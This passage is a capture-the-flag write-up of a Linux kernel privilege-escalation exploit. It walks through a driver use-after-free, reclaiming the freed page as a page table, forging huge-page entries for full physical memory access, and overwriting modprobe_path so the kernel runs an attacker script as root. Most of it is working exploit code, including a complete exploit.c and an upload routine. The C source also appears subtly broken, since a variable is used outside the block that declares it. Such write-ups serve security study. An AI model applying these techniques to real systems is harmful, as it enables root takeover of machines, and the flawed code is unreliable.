This is straightforward, as described above:

```c
int fd = open("/dev/phantom", O_RDWR);
ioctl(fd, CMD_ALLOC, 0);

volatile uint64_t *uaf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                               MAP_SHARED, fd, 0);
ioctl(fd, CMD_FREE, 0);
```

At this point, `uaf` points to a 4KB page that's been returned to the kernel's free list. The page was filled with `0x41` bytes by the driver's alloc handler, so if nothing has reused it yet, we'd see `0x4141414141414141` at every qword.

---

## Phase 2: Reclaiming the page as a PMD

We need the kernel to allocate our freed page as a PMD page. The kernel's page table allocator draws from the same buddy allocator free lists as `alloc_pages()`. When a process touches a virtual address that doesn't have page table structures built out yet, the kernel's page fault handler walks the existing tables, discovers the gap, and allocates new table pages to fill it.

The specific call chain for PMD allocation:

```
handle_page_fault()
  → handle_mm_fault()
    → __handle_mm_fault()
      → __pmd_alloc()           // allocates if PMD page is missing
        → pmd_alloc_one()
          → alloc_page(GFP_PGTABLE_USER)   // GFP_PGTABLE_USER ≈ GFP_KERNEL
```

[`pmd_alloc_one()`](https://elixir.bootlin.com/linux/v6.6.15/source/arch/x86/include/asm/pgalloc.h#L60) ultimately calls `alloc_pages()` with order 0—the exact same allocator and order as our freed page. The freed page sits in the buddy allocator's order-0 free list, and these PMD page allocations pull from that same list.

The strategy: `mmap` 1024 small mappings spaced exactly 2MB apart in virtual address space, then write to each one. The `mmap` call with `MAP_ANONYMOUS` just reserves the virtual address range — Linux is lazy and doesn't allocate physical memory or build page tables until you actually access the address. The write (`*(volatile uint64_t *)p = ...`) is what forces the kernel's hand: it triggers a **page fault**, the kernel walks the page tables, discovers it needs to create new table pages to hold the mapping, and allocates them from the buddy allocator. That's how we get the kernel to pull pages from the same free list where our UAF page is sitting.

```c
#define SPRAY_BASE   0x40000000UL   // 1GB mark
#define SPRAY_STRIDE 0x200000UL     // 2MB

for (int i = 0; i < 1024; i++) {
    void *addr = (void *)(SPRAY_BASE + (uint64_t)i * SPRAY_STRIDE);
    void *p = mmap(addr, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (p != MAP_FAILED)
        *(volatile uint64_t *)p = 0xCAFE0000ULL + i;  // write triggers page fault
}
```

### Why 2MB stride forces PMD allocations

Each PMD entry covers \\(2^{21} = \text{2MB}\\) of virtual address space (bits 29:21 of the virtual address select the PMD entry). A single PMD page holds \\(2^9 = 512\\) entries (\\(512 \times 8\text{ bytes} = 4096\text{ bytes} = \text{one page}\\)), covering \\(512 \times \text{2MB} = \text{1GB}\\) of virtual address space.

Mappings within the same 2MB region share the same PMD entry—they differ only in bits 20:0, which index into the PTE page pointed to by that PMD entry. But mappings in **different** 2MB regions need **different** PMD entries. If those PMD entries are in different PMD pages (because they span more than 1GB), the kernel must allocate multiple PMD pages.

By spacing 1024 mappings exactly 2MB apart, we span addresses `0x40000000` through `0xBFFFF000`:

```
Mapping 0:    0x040000000  →  PMD page A, entry 0     (0x40000000 >> 21 = 512, mod 512 = 0)
Mapping 1:    0x040200000  →  PMD page A, entry 1
...
Mapping 511:  0x07FE00000  →  PMD page A, entry 511
Mapping 512:  0x080000000  →  PMD page B, entry 0    (crosses 1GB boundary)
...
Mapping 1023: 0x0BFE00000  →  PMD page B, entry 511
```

Before our spray, this address range was unused. The PGD and PUD entries for it may or may not exist, but the PMD pages definitely don't. When we touch each mapping, the kernel:

1. Takes a page fault (the PTE is missing)
2. Walks from CR3 → PGD → PUD → PMD → discovers the PMD entry is empty
3. Allocates a new PTE page to hold the mapping
4. If the PMD page itself doesn't exist yet (first touch in this 1GB range), allocates a new PMD page too

The PMD page allocations (at most 2 for 1024 mappings across 2GB) are what we want. But note: the spray also allocates 1024 PTE pages (one per mapping, since each mapping is in a different 2MB region) and 1024 data pages (the anonymous pages that back our written values). That's \\(1024 + 1024 + 2 \approx 2050\\) page allocations, creating plenty of demand from the buddy allocator.

With 256MB of RAM and a minimal busybox system, the free page pool contains on the order of \\(\sim\\!50{,}000\\) free pages. Our freed page is one of them. The \\(\sim\\!2050\\) allocations during the spray have a high probability of grabbing it, and we specifically want it grabbed as a **PMD page** (not as a data page or PTE page). Since the PMD page allocations happen early in the spray (as soon as the first mapping in each 1GB range is touched), and our recently-freed page is likely near the head of the free list (the buddy allocator uses LIFO within each free list), the probability is high.

### Verifying reclamation

After the spray, we check the UAF pointer to see what's there:

```c
int count = 0;
for (int i = 0; i < 512; i++) {
    uint64_t v = uaf[i];
    if (v && v != 0x4141414141414141ULL &&
        (v & PT_PRESENT) && (v & PT_USER))
        count++;
}
```

If the page was reclaimed as a PMD, its 512 qwords are no longer `0x4141414141414141`. Instead, they're **PTE page physical addresses** with flag bits set. Each PMD entry points to a PTE page, and the entries have at least Present (bit 0) and User (bit 2) set. A successful PMD reclaim shows a high count—ideally 512/512 since we touched a mapping in every 2MB slot.

There's an ambiguity here: we can't easily tell from the entry values alone whether our page was reclaimed as a **PMD page** (entries point to PTE pages) or a **PTE page** (entries point to data pages). Both types of entries have Present and User set, and both contain physical addresses in the upper bits. The verification step doesn't try to distinguish — it just confirms the page contains page table entries of *some* kind, not `0x41` fill data. Phase 3 resolves the ambiguity by probing from userspace: we write a huge page entry and observe whether it actually changes address translation, which only works if we control a PMD page.

If the count is low (say \\(< 64\\)), the page wasn't reclaimed as a page table at all — maybe it became an anonymous data page or page cache page. In that case, we'd need to retry the entire exploit.

---

## Phase 3: Identifying the PMD's virtual address range

We know our UAF page is *a* PMD page, but we don't know *which one*. Our spray covers two 1GB ranges, so the page is either the PMD for `0x40000000–0x7FFFFFFF` or for `0x80000000–0xBFFFFFFF`. We need to know the exact base address so we can calculate the relationship: PMD entry `i` controls the 2MB virtual range starting at `virt_base + i * 0x200000`.

The trick: temporarily corrupt a PMD entry and observe the effect from userspace. We replace PMD entry 0 with a **2MB huge page entry** mapping physical address 0:

```c
uint64_t saved = uaf[0];
uaf[0] = 0xE7;         // phys_addr=0 | P|RW|US|A|D|PS
getpid();               // flush TLB (CR3 reload via syscall)
```

The value `0xE7` as a PMD entry means:

```
bits 51:21 = 0x0          → physical base address 0 (first 2MB of RAM)
bit 7      = 1 (PS)       → this is a 2MB huge page, skip PTE level
bit 6      = 1 (D)        → dirty
bit 5      = 1 (A)        → accessed
bit 2      = 1 (U/S)      → userspace-accessible
bit 1      = 1 (R/W)      → writable
bit 0      = 1 (P)        → present
```

After the TLB flush, whichever 2MB virtual range was governed by PMD entry 0 no longer maps to a PTE page and its associated data pages. Instead, it maps **directly** to physical addresses `0x000000–0x1FFFFF` (the first 2MB of physical RAM — BIOS data, real-mode IVT, etc.).

Now we test: read from `SPRAY_BASE` (the first address in our spray). During Phase 2, we wrote `0xCAFE0000` there, and under normal translation (PMD → PTE → data page) we'd read that value back. But if `SPRAY_BASE` falls in the 2MB range we just redirected to physical address 0, the read goes to physical RAM instead and returns whatever is there (certainly not `0xCAFE0000`). A mismatch tells us this address range is governed by our PMD:

```c
volatile uint64_t probe = *(volatile uint64_t *)SPRAY_BASE;
uaf[0] = saved;        // restore original PMD entry (points back to PTE page)
getpid();               // flush again to restore normal translation

if (probe != 0xCAFE0000ULL) {
    // SPRAY_BASE is governed by our PMD entry 0
    virt_base = SPRAY_BASE;
}
```

If `SPRAY_BASE` still reads `0xCAFE0000`, then it's governed by the *other* PMD page (the one we don't control). We try the second candidate:

```c
// Try the second 1GB range
saved = uaf[0];
uaf[0] = 0xE7;
getpid();
probe = *(volatile uint64_t *)(SPRAY_BASE + 512 * 0x200000);
uaf[0] = saved;
getpid();
if (probe != (0xCAFE0000ULL + 512))
    virt_base = SPRAY_BASE + 512 * 0x200000;
```

One of the two candidates will hit. This probe is safe because we immediately restore the original PMD entry: the corruption is transient, lasting only for the single read. Even if a signal or interrupt occurs during the window, the worst case is reading from low physical memory (the BIOS/real-mode area), which is mapped and readable.

Once identified, the relationship is fixed and deterministic: virtual address `virt_base + i * 0x200000` is translated through `uaf[i]`. Modifying `uaf[i]` changes where that virtual address points in physical memory. This is the core primitive that drives the rest of the exploit.

---

## Phase 4: Arbitrary physical memory access

This is where the exploit becomes powerful. Assuming reclamation succeeded (Phase 2 verified this, Phase 3 confirmed it's a PMD), we have a full PMD page: 512 entries, each controlling \\(\text{2MB}\\) of virtual-to-physical translation. Our spray populated all 512 slots (one mapping per 2MB region), so every entry contains a valid PTE page pointer. We can overwrite any of them. By writing `physical_address | 0xE7` into an entry, we replace the normal PMD → PTE → data page translation with a direct 2MB huge page mapping to arbitrary physical memory. After a TLB flush, reads and writes through the corresponding virtual address go directly to the chosen physical RAM.

The reclamation is probabilistic — there's no guarantee the freed page becomes a PMD page rather than a data page or PTE page. But with only 256MB of RAM and LIFO free list behavior, the probability is high. The exploit exits early and asks for a retry if reclamation fails; in practice it succeeds on the first attempt most of the time.

The flags we use (`0xE7`) create a maximally permissive entry:

```c
#define PMD_HUGE  0xE7ULL
// Bit 0 (P):   Present
// Bit 1 (R/W): Read-write
// Bit 2 (U/S): User-accessible (critical: without this, userspace reads would fault)
// Bit 5 (A):   Accessed (pre-set to avoid hardware setting it later)
// Bit 6 (D):   Dirty (pre-set to avoid write-protection faults)
// Bit 7 (PS):  Page Size = 1 → 2MB huge page (skip PTE level)
```

Pre-setting the Accessed and Dirty bits avoids hardware interference. When the CPU accesses a page whose A bit is clear, it performs a read-modify-write on the page table entry to set it. Same for the D bit on the first write. These are atomic hardware operations on the PMD entry — but we're modifying entries through a UAF mapping, so a concurrent hardware write could race with our changes. Pre-setting both bits means the CPU sees them already set and leaves the entry alone.

### The naive approach and why it failed

The obvious approach: iterate through physical memory in 2MB chunks, each time setting `uaf[0]` to a new physical address, flushing the TLB, and reading through `virt_base`:

```c
// This doesn't work reliably!
for (int chunk = 0; chunk < 128; chunk++) {
    uaf[0] = (chunk * 0x200000UL) | 0xE7;
    getpid();  // TLB flush
    // read through virt_base...
}
```

This should work in theory—writing CR3 flushes the entire TLB on CPUs without PCID (Process Context IDentifiers), and our QEMU `qemu64` CPU doesn't support PCID. But in practice, QEMU's software MMU emulation has a subtlety: repeatedly overwriting the same PMD slot with different huge page entries and flushing between each doesn't always produce fully fresh translations. The QEMU softmmu TLB is a software structure that gets invalidated on CR3 writes, but the invalidation granularity or timing doesn't perfectly match real hardware behavior. We observed stale reads where the data from a previous chunk appeared at addresses that should reflect the new mapping.

On real hardware with real TLBs, this sequential approach would work. But we're in QEMU, so we need a workaround.

### The parallel PMD approach

The solution is elegant: avoid reusing the same PMD entry index entirely. Instead of modifying entry 0 for each chunk, we **set up all 128 entries simultaneously**, each pointing to a different 2MB physical chunk:

```c
// 256MB RAM = 128 chunks of 2MB
uint64_t saved_pmds[MAX_CHUNKS];
for (int chunk = 0; chunk < MAX_CHUNKS; chunk++) {
    saved_pmds[chunk] = uaf[chunk];               // save original PTE-page pointer
    uaf[chunk] = ((uint64_t)chunk * 0x200000UL) | PMD_HUGE;  // huge page → phys chunk
}
getpid();  // single TLB flush
```

After this single setup and one TLB flush, the first 128 entries of our PMD page create a linear map of all physical memory:

| PMD entry | Virtual address | Maps to physical |
|-----------|----------------|-----------------|
| `uaf[0]` | `virt_base + 0 * 2MB` | `0x000000 – 0x1FFFFF` |
| `uaf[1]` | `virt_base + 1 * 2MB` | `0x200000 – 0x3FFFFF` |
| `uaf[2]` | `virt_base + 2 * 2MB` | `0x400000 – 0x5FFFFF` |
| ... | ... | ... |
| `uaf[127]` | `virt_base + 127 * 2MB` | `0xFE00000 – 0xFFFFFFF` |

All \\(\text{256MB}\\) of physical RAM is now simultaneously accessible as a contiguous \\(\text{256MB}\\) virtual region. Each PMD entry is used only once, so every translation is fresh—no TLB staleness. We can scan the entire physical address space in a single pass without any additional TLB flushes.

This is conceptually similar to the kernel's own direct map (`page_offset_base`), except we've constructed it from userspace by forging page table entries. The kernel's SMEP/SMAP protections are irrelevant here: those prevent the **kernel** from accessing **userspace** pages, not the other way around. We're in userspace, accessing physical memory through valid (forged) page table entries. The MMU hardware enforces the page table, and our entries say "user-accessible, read-write."

---

## Phase 5: Finding `modprobe_path`

We have arbitrary physical memory read/write. Now we need a target — something in kernel memory we can overwrite to escalate privileges.

`modprobe` is a userspace utility that loads kernel modules (`.ko` files). When the kernel needs a module it doesn't have — for example, a filesystem driver or a network protocol — it doesn't load the module directly. Instead, it spawns a userspace process that runs the `modprobe` binary, which resolves dependencies and loads the module via `insmod`. The kernel stores the path to this utility in a global variable called [`modprobe_path`](https://elixir.bootlin.com/linux/v6.6.15/source/kernel/module/kmod.c#L55), defaulting to `"/sbin/modprobe"`.

The reason we care: `modprobe_path` is a **writable string in kernel memory**, and the kernel executes whatever path it contains **as root**. If we can overwrite it to point at a script we control, the kernel will run our script with full root privileges. We just need a way to trigger the kernel into calling modprobe — which turns out to be easy (Phase 6 covers this). First, we need to find the string in physical memory.

The variable is defined as:

```c
// kernel/module/kmod.c
char modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;
// KMOD_PATH_LEN = 256, CONFIG_MODPROBE_PATH = "/sbin/modprobe"
```

It's a 256-byte `char` array in the kernel's `.data` section (writable data, not `.rodata`). The default value is `"/sbin/modprobe"` (15 bytes including the null terminator), followed by \\(256 - 15 = 241\\) bytes of zeros. We need to find its physical address so we can overwrite it.

### Why the offset within 2MB is fixed

KASLR randomizes the kernel's base address, both virtual (`_text`) and physical (where in RAM the kernel image is loaded). However, the physical placement is always aligned to at least 2MB (`CONFIG_PHYSICAL_ALIGN`), and typically to a larger power of two. This means the kernel's physical base address is always \\(N \times \texttt{0x200000}\\) for some integer \\(N\\).

Since `modprobe_path` is at a fixed offset from the kernel's base, and the base is 2MB-aligned, `modprobe_path`'s offset **within its 2MB physical chunk** is constant regardless of KASLR. Given the symbol's virtual address offset from `_text`:

```
0x1b3f5c0 % 0x200000 = 0x1b3f5c0 & 0x1FFFFF = 0x13f5c0
```

To extract this offset, we decompress `vmlinux` from the `bzImage` (using `extract-vmlinux` or similar) and look up the symbol in the symbol table. The exact offset depends on the kernel build, but for this challenge's kernel 6.6.15, it's `0x13f5c0`.

### The fast scan

With all 128 PMD entries already set up as huge pages (from Phase 4), we have a 256MB window into physical RAM. We just check offset `0x13f5c0` in each 2MB chunk — only \\(128\\) memory reads to search the entire physical address space:

```c
#define KNOWN_OFF 0x13f5c0

for (int chunk = 0; chunk < MAX_CHUNKS && !found; chunk++) {
    volatile char *w = (volatile char *)(virt_base + (uint64_t)chunk * PAGE_2M);

    // Quick pre-filter: check key characters before full comparison
    if (w[KNOWN_OFF] == '/' && w[KNOWN_OFF+1] == 's' &&
        w[KNOWN_OFF+5] == '/' && w[KNOWN_OFF+6] == 'm') {

        // Full 14-byte comparison: "/sbin/modprobe"
        const char *ref = "/sbin/modprobe";
        int ok = 1;
        for (int j = 0; j < 14 && ok; j++)
            if (w[KNOWN_OFF + j] != ref[j]) ok = 0;

        if (ok) {
            mod_phys = (uint64_t)chunk * PAGE_2M + KNOWN_OFF;
            found = 1;
        }
    }
}
```

The pre-filter checks 4 strategic characters first (`/`, `s`, `/`, `m`) to avoid the full 14-byte comparison on every chunk. In practice, only one chunk contains `/sbin/modprobe` at this exact offset, so the pre-filter immediately rejects \\(127\\) of \\(128\\) chunks.

The exploit also includes a slow-scan fallback that does a byte-by-byte search through each 2MB chunk, in case the `KNOWN_OFF` calculation is wrong. Note that the fallback uses the sequential single-slot approach (rewriting `uaf[scan_idx]` in a loop) that we identified as unreliable in QEMU — so it may suffer from the same TLB staleness issues. It's a last resort; in practice, the fast scan always succeeds.

After the scan, we restore all 128 PMD entries and flush:

```c
for (int chunk = 0; chunk < MAX_CHUNKS; chunk++)
    uaf[chunk] = saved_pmds[chunk];
getpid();
```

The process's page tables are back to normal. Our spray mappings work as before—the original PMD entries (which pointed to PTE pages holding our `0xCAFE0000 + i` data pages) are restored.

---

## Phase 6: Overwriting `modprobe_path`

### How `modprobe_path` gets executed

When a process calls `execve()` on a file, the kernel inspects the file's first few bytes (the "magic number") to determine its format. ELF binaries start with `\x7fELF`, shell scripts start with `#!`, and so on. The kernel iterates through its registered binary handlers ([`search_binary_handler`](https://elixir.bootlin.com/linux/v6.6.15/source/fs/exec.c#L1720)):

```c
// fs/exec.c (simplified)
static int search_binary_handler(struct linux_binprm *bprm) {
    list_for_each_entry(fmt, &formats, lh) {
        retval = fmt->load_binary(bprm);
        if (retval != -ENOEXEC)
            return retval;  // handler claimed it
    }
    // No handler matched → try to load a binfmt module
    request_module("binfmt-%04x", *(unsigned short *)(bprm->buf + 2));
    // ... retry handlers ...
}
```

If no handler recognizes the format, [`request_module()`](https://elixir.bootlin.com/linux/v6.6.15/source/kernel/module/kmod.c#L132) tries to load a kernel module that might handle it. This calls `__request_module()` → [`call_modprobe()`](https://elixir.bootlin.com/linux/v6.6.15/source/kernel/module/kmod.c#L173):

```c
// kernel/module/kmod.c (simplified)
static int call_modprobe(char *module_name, int wait) {
    char *argv[] = { modprobe_path, "-q", "--", module_name, NULL };
    struct subprocess_info *info;

    info = call_usermodehelper_setup(modprobe_path, argv, ...);
    return call_usermodehelper_exec(info, wait);
}
```

[`call_usermodehelper_exec()`](https://elixir.bootlin.com/linux/v6.6.15/source/kernel/umh.c#L425) spawns a new kernel thread that transitions to userspace and `execve()`s the path at `modprobe_path`. This execution happens with **full root privileges** (uid 0, gid 0, all capabilities). It's a kernel-internal mechanism that predates any namespace or security module filtering in most configurations.

The full call chain:

```
execve("/tmp/dummy")                                    ← userspace (uid 1000)
  → do_execve() → do_execveat_common()
    → bprm_execve()
      → exec_binprm()
        → search_binary_handler()
          → [no handler matches 0xffffffff magic]
            → request_module("binfmt-ffff")
              → call_modprobe("binfmt-ffff")
                → call_usermodehelper_setup(modprobe_path, ...)
                  → call_usermodehelper_exec(...)         ← kernel thread
                    → execve(modprobe_path) as root       ← root context!
```

If we overwrite `modprobe_path` from `"/sbin/modprobe"` to `"/tmp/x"`, the kernel will execute `/tmp/x` as root. We control `/tmp/x`.

### The overwrite

First, prepare a payload script that copies the flag:

```c
system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag'"
       " > /tmp/x && chmod +x /tmp/x");
```

This creates `/tmp/x` containing:

```sh
#!/bin/sh
cp /flag /tmp/flag
chmod 777 /tmp/flag
```

Then we set up a single PMD entry to map the 2MB chunk containing `modprobe_path` and write over the string:

```c
// Calculate which 2MB chunk contains modprobe_path
uint64_t mod_chunk = (mod_phys / PAGE_2M) * PAGE_2M;  // 2MB-aligned base
int mod_off = mod_phys - mod_chunk;                     // offset within chunk

// Map the chunk via PMD entry 0
uaf[0] = mod_chunk | PMD_HUGE;
getpid();  // TLB flush

// Overwrite the string in physical memory
volatile char *p = (volatile char *)virt_base + mod_off;
p[0]='/'; p[1]='t'; p[2]='m'; p[3]='p';
p[4]='/'; p[5]='x'; p[6]='\0';

// Restore and flush
uaf[0] = saved_pmd;
getpid();
```

We write byte-by-byte rather than using `memcpy` to avoid any potential issues with word-tearing or compiler optimization on a volatile pointer. The original string `"/sbin/modprobe\0"` is 15 bytes; we overwrite the first 7 bytes with `"/tmp/x\0"`. The null terminator at byte 6 ends the C string — the remaining bytes (`odprobe\0...`) are past the \\(\texttt{'\textbackslash 0'}\\) and never read.

We're writing directly to the kernel's `.data` section through physical memory, bypassing all kernel protections:

- **SMEP/SMAP**: Only prevent the kernel from executing/accessing *userspace* pages. They don't prevent userspace from accessing kernel memory.
- **KASLR**: Randomizes virtual addresses, but we're working with physical addresses discovered by scanning.
- **Read-only mappings**: The kernel's virtual mapping of `.data` is read-write (it's not `.rodata`), but even if it weren't, we're accessing the physical memory directly through our forged PTE. The kernel's page table permissions for its own mapping of this page are irrelevant—we have our own mapping with different permissions.
- **W^X / CONFIG_STRICT_KERNEL_RWX**: This makes kernel `.text` non-writable via the kernel's own page tables. But again, our forged PMD bypasses the kernel's page tables entirely. We're creating an independent, parallel mapping to the same physical memory.

---

## Phase 7: Trigger and flag

Execute a file with an unrecognized magic number. Four `0xFF` bytes don't match any known binary format handler:

```c
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy"
       " && chmod +x /tmp/dummy"
       " && /tmp/dummy 2>/dev/null; true");
usleep(100000);  // wait for usermode helper to run

system("cat /tmp/flag 2>/dev/null || echo '[-] no flag'");
```

The magic bytes `0xFFFFFFFF` are chosen deliberately:

- Not `\x7fELF` (ELF)
- Not `#!` (script)
- Not `\x00asm` (wasm, if configured)
- Not any other registered `binfmt` magic

The `; true` after `/tmp/dummy` ensures the `system()` call returns success even though `execve` fails. The `2>/dev/null` suppresses the "exec format error" message. The `usleep(100000)` (100ms) gives the kernel's usermode helper thread time to spawn and execute `/tmp/x` asynchronously.

The kernel's sequence: `execve("/tmp/dummy")` fails to find a handler, triggers `request_module("binfmt-ffff")`, which runs `modprobe_path` (now `"/tmp/x"`) as root. Our script copies `/flag` to `/tmp/flag` with mode 777. We read it from our unprivileged context.

---

## Remote deployment

The remote gives a busybox shell inside the QEMU VM over netcat. There's no `scp`, `wget`, `curl`, or any file transfer tool. The only way to get a binary onto the VM is to echo base64-encoded chunks through the shell.

### The binary size problem

A statically linked glibc binary is 721KB. The size breakdown:

```
 721KB  total (gcc -static)
 ~450KB glibc internal code (locale, nsswitch, pthread, math)
 ~200KB libc startup, stdio, malloc, string ops
  ~70KB our actual exploit code
```

After gzip compression and base64 encoding: \\(721\text{KB} \to 320\text{KB} \to 427\text{KB}\\) base64 → **446 echo commands** at 960 bytes each. Each command is sent over the network, processed by the shell, and appended to a file. With network latency and shell processing overhead, the upload takes 30-60 seconds. The remote VM has a session timeout, and our first attempts uploaded successfully but the connection was killed before the exploit could start running.

### musl-gcc to the rescue

Switching to [musl libc](https://musl.libc.org/) produces dramatically smaller static binaries. musl was designed for correctness and minimal binary size in static linking, without glibc's enormous infrastructure (no NSS, no iconv tables, no locale machinery, no libpthread bloat):

```sh
musl-gcc -static -Os -s -o exploit exploit.c
```

| | glibc | musl |
|-----|-------|------|
| Binary size | 721 KB | **39 KB** |
| Gzipped | 320 KB | 17 KB |
| Base64 | 427 KB | 23 KB |
| Echo chunks | 446 | **25** |

\\(18\times\\) **smaller.** The upload completes in under 2 seconds, leaving the entire session timeout for the exploit.

The flags: `-Os` optimizes for size (shorter instruction sequences, less inlining). `-s` strips the symbol table and debug info. `-static` links musl statically (no dynamic linker needed in the VM). The combination produces a minimal self-contained binary.

### Upload pipeline

The solve script compresses, base64-encodes, chunks, and uploads:

```python
compressed = gzip.compress(data, compresslevel=9)
b64 = base64.b64encode(compressed).decode()

# Upload in 960-byte chunks via echo -n append
r.sendline(b"cat /dev/null > /tmp/b64")  # initialize file
for chunk in chunks:
    r.sendline(f"echo -n '{chunk}'>>/tmp/b64".encode())

# Decode: base64 → gzip → binary
r.sendline(b"base64 -d /tmp/b64 > /tmp/e.gz && gzip -d /tmp/e.gz "
           b"&& mv /tmp/e /tmp/exploit && chmod +x /tmp/exploit")
```

Two subtle gotchas discovered during development:

1. **Busybox's `gunzip` requires `.gz` extension.** Unlike GNU gzip, busybox's implementation refuses to decompress files that don't end in `.gz`. Piping (`base64 -d | gzip -d > file`) works as a workaround, but saving as `.gz` and then decompressing was more reliable across different busybox builds.

2. **Chunk size matters.** Chunks larger than ~1000 bytes can hit shell line-length limits or cause echo to misbehave on some busybox configurations. 960 bytes (divisible by 4 for clean base64) is a safe sweet spot.

The periodic `echo SYNC` / `recvuntil("SYNC")` synchronization in the solve script prevents the send buffer from overflowing: if we send all 25 chunks at full speed without waiting, some shells drop input.

---

## Solve scripts

<details>
<summary>exploit.c</summary>

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702
#define DEVICE    "/dev/phantom"

#define PAGE_SIZE    0x1000
#define PAGE_2M      0x200000UL
#define SPRAY_COUNT  1024
#define SPRAY_BASE   0x40000000UL
#define SPRAY_STRIDE PAGE_2M

#define PMD_HUGE 0xE7ULL

#define PT_PRESENT (1ULL << 0)
#define PT_USER    (1ULL << 2)

#define MAX_CHUNKS 128

static void die(const char *m) { perror(m); exit(1); }
static inline void tlb_flush(void) { getpid(); }

int main(void) {
    int dev_fd;
    volatile uint64_t *uaf;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    printf("[*] Phantom exploit\n");

    /* ---- UAF ---- */
    dev_fd = open(DEVICE, O_RDWR);
    if (dev_fd < 0) die("open");
    if (ioctl(dev_fd, CMD_ALLOC, 0) < 0) die("alloc");

    uaf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
               MAP_SHARED, dev_fd, 0);
    if (uaf == MAP_FAILED) die("mmap");

    if (ioctl(dev_fd, CMD_FREE, 0) < 0) die("free");
    printf("[+] UAF active\n");

    /* ---- PTE spray -> reclaim page as PMD page ---- */
    for (int i = 0; i < SPRAY_COUNT; i++) {
        void *a = (void *)(SPRAY_BASE + (uint64_t)i * SPRAY_STRIDE);
        void *p = mmap(a, PAGE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        if (p != MAP_FAILED)
            *(volatile uint64_t *)p = 0xCAFE0000ULL + i;
    }

    int count = 0;
    for (int i = 0; i < 512; i++) {
        uint64_t v = uaf[i];
        if (v && v != 0x4141414141414141ULL &&
            (v & PT_PRESENT) && (v & PT_USER))
            count++;
    }
    printf("[+] %d/512 page table entries\n", count);
    if (count < 64) { printf("[-] Retry\n"); return 1; }

    /* ---- Identify virtual base ---- */
    uint64_t virt_base = 0;
    uint64_t saved = uaf[0];
    uaf[0] = PMD_HUGE;
    tlb_flush();
    volatile uint64_t probe = *(volatile uint64_t *)SPRAY_BASE;
    uaf[0] = saved;
    tlb_flush();

    if (probe != 0xCAFE0000ULL) {
        virt_base = SPRAY_BASE;
    } else {
        saved = uaf[0];
        uaf[0] = PMD_HUGE;
        tlb_flush();
        probe = *(volatile uint64_t *)(SPRAY_BASE + 512 * SPRAY_STRIDE);
        uaf[0] = saved;
        tlb_flush();
        if (probe != (0xCAFE0000ULL + 512))
            virt_base = SPRAY_BASE + 512 * SPRAY_STRIDE;
    }

    if (!virt_base) { printf("[-] PMD identification failed\n"); return 1; }
    printf("[+] PMD base: 0x%lx\n", virt_base);

    /* ---- Scan physical memory ---- */
    volatile char *window = (volatile char *)virt_base;

    printf("[*] Scanning physical memory...\n");
    uint64_t mod_phys = 0;
    int found = 0;

    /* Fast scan: parallel PMD entries */
    #define KNOWN_OFF 0x13f5c0
    uint64_t saved_pmds[MAX_CHUNKS];
    for (int chunk = 0; chunk < MAX_CHUNKS; chunk++) {
        saved_pmds[chunk] = uaf[chunk];
        uaf[chunk] = ((uint64_t)chunk * PAGE_2M) | PMD_HUGE;
    }
    tlb_flush();
    for (int chunk = 0; chunk < MAX_CHUNKS && !found; chunk++) {
        volatile char *w = (volatile char *)(virt_base + (uint64_t)chunk * PAGE_2M);
        if (w[KNOWN_OFF] == '/' && w[KNOWN_OFF+1] == 's' &&
            w[KNOWN_OFF+5] == '/' && w[KNOWN_OFF+6] == 'm') {
            const char *ref = "/sbin/modprobe";
            int ok = 1;
            for (int j = 0; j < 14 && ok; j++)
                if (w[KNOWN_OFF + j] != ref[j]) ok = 0;
            if (ok) {
                mod_phys = (uint64_t)chunk * PAGE_2M + KNOWN_OFF;
                found = 1;
            }
        }
    }
    for (int chunk = 0; chunk < MAX_CHUNKS; chunk++)
        uaf[chunk] = saved_pmds[chunk];
    tlb_flush();

    /* Slow scan fallback */
    if (!found) {
        printf("[*] Fast scan missed, trying slow scan...\n");
        uint64_t saved_pmd = uaf[0];
        for (int chunk = 0; chunk < MAX_CHUNKS && !found; chunk++) {
            uint64_t phys = (uint64_t)chunk * PAGE_2M;
            uaf[0] = phys | PMD_HUGE;
            tlb_flush();
            for (int off = 0; off <= (int)PAGE_2M - 15 && !found; off += 8) {
                if (window[off] != '/') continue;
                if (window[off+5] != '/' || window[off+6] != 'm') continue;
                const char *ref = "/sbin/modprobe";
                int ok = 1;
                for (int j = 0; j < 14 && ok; j++)
                    if (window[off + j] != ref[j]) ok = 0;
                if (ok) { mod_phys = phys + off; found = 1; }
            }
        }
        uaf[0] = saved_pmd;
        tlb_flush();
    }

    if (!found) { printf("[-] Not found\n"); return 1; }
    printf("[+] modprobe_path @ phys 0x%lx\n", mod_phys);

    /* ---- Prepare payload ---- */
    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag'"
           " > /tmp/x && chmod +x /tmp/x");

    /* ---- Overwrite modprobe_path ---- */
    uint64_t mod_chunk = (mod_phys / PAGE_2M) * PAGE_2M;
    int mod_off = mod_phys - mod_chunk;

    uaf[0] = mod_chunk | PMD_HUGE;
    tlb_flush();

    volatile char *p = window + mod_off;
    p[0]='/'; p[1]='t'; p[2]='m'; p[3]='p';
    p[4]='/'; p[5]='x'; p[6]='\0';

    uaf[0] = saved_pmd;
    tlb_flush();
    printf("[+] modprobe_path -> /tmp/x\n");

    /* ---- Trigger ---- */
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy"
           " && chmod +x /tmp/dummy"
           " && /tmp/dummy 2>/dev/null; true");
    usleep(100000);

    printf("\n");
    system("cat /tmp/flag 2>/dev/null || echo '[-] no flag'");

    return 0;
}
```

</details>

<details>
<summary>solve.py (remote)</summary>

```python
#!/usr/bin/env python3
from pwn import *
import base64, gzip, sys, os

context.log_level = "info"
EXPLOIT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploit")


